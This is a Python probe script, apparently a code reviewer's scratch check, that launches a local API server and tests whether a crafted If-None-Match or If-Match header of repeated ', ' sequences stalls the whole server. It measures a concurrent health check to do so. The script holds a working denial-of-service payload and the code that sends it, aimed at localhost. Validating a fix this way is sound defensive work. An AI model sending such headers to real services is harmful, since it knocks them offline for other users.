"""Live probe: does one crafted If-None-Match header stall the whole server? (validator scratch)

Starts the PR-head app under uvicorn in a subprocess, creates a dataset, then sends
GET /v1/datasets/{id} with a ~45-byte If-None-Match while timing an unrelated
GET /v1/health on a second connection. Bounded input (k=21/22) so the stall is ~1-2 s.
"""

import os
import socket
import subprocess
import sys
import threading
import time
from pathlib import Path

import httpx

HERE = Path(__file__).resolve().parent
PY = sys.executable


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def main() -> None:
    port = free_port()
    storage = HERE / "live_storage"
    storage.mkdir(exist_ok=True)
    proc = subprocess.Popen([PY, str(HERE / "serve.py"), str(port), str(storage)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    base = f"http://127.0.0.1:{port}"
    headers = {"X-API-Key": "probe-key"}
    try:
        for _ in range(100):
            try:
                if httpx.get(f"{base}/v1/health", timeout=1).status_code == 200:
                    break
            except Exception:
                time.sleep(0.2)
        created = httpx.post(f"{base}/v1/datasets", json={"generator": "spiral", "params": {"n_spirals": 2, "n_points_per_spiral": 20, "seed": 1}}, headers=headers, timeout=30)
        print("create:", created.status_code)
        dsid = created.json()["dataset_id"]
        # baseline health latency
        t0 = time.perf_counter()
        httpx.get(f"{base}/v1/health", timeout=30)
        print(f"baseline health latency: {(time.perf_counter() - t0) * 1000:.1f} ms")
        for route, k in ((f"/v1/datasets/{dsid}", 21), (f"/v1/datasets/{dsid}", 22)):
            evil = ", " * k + "x"
            result: dict = {}

            def attack() -> None:
                t = time.perf_counter()
                r = httpx.get(f"{base}{route}", headers={**headers, "If-None-Match": evil}, timeout=600)
                result["attack"] = (r.status_code, time.perf_counter() - t)

            th = threading.Thread(target=attack)
            th.start()
            time.sleep(0.05)
            t = time.perf_counter()
            h = httpx.get(f"{base}/v1/health", timeout=600)
            health_latency = time.perf_counter() - t
            th.join()
            print(f"route={route} header_len={len(evil)} attack={result['attack'][0]} in {result['attack'][1]:.2f}s; concurrent /v1/health {h.status_code} took {health_latency:.2f}s")
        # the conditional PATCH path: runs in a worker thread, inside update_tags' lock
        evil = ", " * 22 + "x"
        result = {}

        def attack_patch() -> None:
            t = time.perf_counter()
            r = httpx.patch(f"{base}/v1/datasets/{dsid}/tags", json={"add_tags": ["t"]}, headers={**headers, "If-Match": evil}, timeout=600)
            result["attack"] = (r.status_code, time.perf_counter() - t)

        th = threading.Thread(target=attack_patch)
        th.start()
        time.sleep(0.05)
        t = time.perf_counter()
        h = httpx.get(f"{base}/v1/health", timeout=600)
        health_latency = time.perf_counter() - t
        th.join()
        print(f"PATCH If-Match header_len={len(evil)} -> {result['attack'][0]} in {result['attack'][1]:.2f}s; concurrent /v1/health {h.status_code} took {health_latency:.2f}s")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            proc.kill()
        out = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
        print("server output tail:", out[-600:])


if __name__ == "__main__":
    os.environ.setdefault("JUNIPER_SKIP_AUTH_POSTURE_CHECK", "0")
    main()
